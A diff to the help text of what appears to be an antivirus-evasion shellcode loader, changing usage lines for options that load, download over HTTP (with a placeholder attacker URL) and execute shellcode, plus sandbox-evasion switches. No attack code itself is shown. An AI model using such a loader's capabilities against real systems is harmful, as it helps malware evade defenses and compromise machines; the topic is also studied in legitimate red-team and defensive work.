@@ -245,13 +245,14 @@ int main (int argc, char **argv)
 void print_help()
 {
 	printf("Options:\n");
-	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
+	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin\n");
+	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
 	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
 	printf("-d download a raw shellcode via http in memory and exec (no overhead, use socket)\n");
 	printf("   usage example: pwn.exe http://yourserver/yourpayload.bin\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
-	printf("   Note: with -l -E is mandatory\n");
+	printf("   Can be used with -l\n");
 	//printf("-A use metasploits ASCII encryption, usage is like -E\n");
 	printf("-F use fopen sandbox evasion\n");
 	printf("-k \"killswitch\" sandbox evasion with gethostbyname\n");
